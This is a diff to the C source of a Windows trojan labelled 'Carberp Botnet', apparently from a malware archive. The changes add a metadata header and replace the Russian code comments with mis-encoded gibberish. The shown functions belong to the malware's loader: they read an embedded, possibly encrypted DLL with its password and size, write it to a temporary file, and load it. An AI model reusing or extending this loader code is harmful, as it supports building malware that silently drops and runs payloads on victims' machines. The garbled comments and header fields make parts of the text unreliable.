@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <Windows.h>
 #include "LoaderDLL.h"
 #include "LoaderUtils.h"
@@ -13,9 +24,9 @@ typedef struct TDLLINFO
 
 
 //-------------------------------------------------
-//  Функция возвращает информацию о буфере
-//  загифрованной библиотеки. Используется
-//  информация заголовков
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
 //-------------------------------------------------
 bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Password)
@@ -30,13 +41,13 @@ bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Passw
 
 	if (CalcHash(Temp, ENCRYPTED_DLL_MARKER_SIZE) != ENCRYPTED_DLL_MARKER_HASH)
 	{
-		// ДЛЛ Зашифрована, возвращаем пароль
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
         Password = Temp;
 	}
 
 	Temp += ENCRYPTED_DLL_MARKER_SIZE;
 
-	// Получаем размер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Size = *(PDWORD)Temp;
 	Temp += sizeof(DWORD);
 
@@ -47,7 +58,7 @@ bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Passw
 
 
 
-// Функция записывает данне длл в файл
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 bool SaveMemLibrary(LPVOID Dll, PCHAR FileName)
 {
 	bool FreeBuf;
@@ -85,11 +96,11 @@ HMEMMODULE LoadMemLibrary(LPVOID Buf)
 	{
 		DLL->FileName = (PCHAR)MemAlloc(MAX_PATH);
 		DLL->Handle = 0;
-		// Создаём временный файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		GetTempPathA(MAX_PATH, DLL->FileName);
 		GetTempFileNameA("c:\\", NULL, 0, DLL->FileName);
 
-		// Записываем длл в файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 		bool Result = SaveMemLibrary(Buf, DLL->FileName);
 		
 		if (Result)
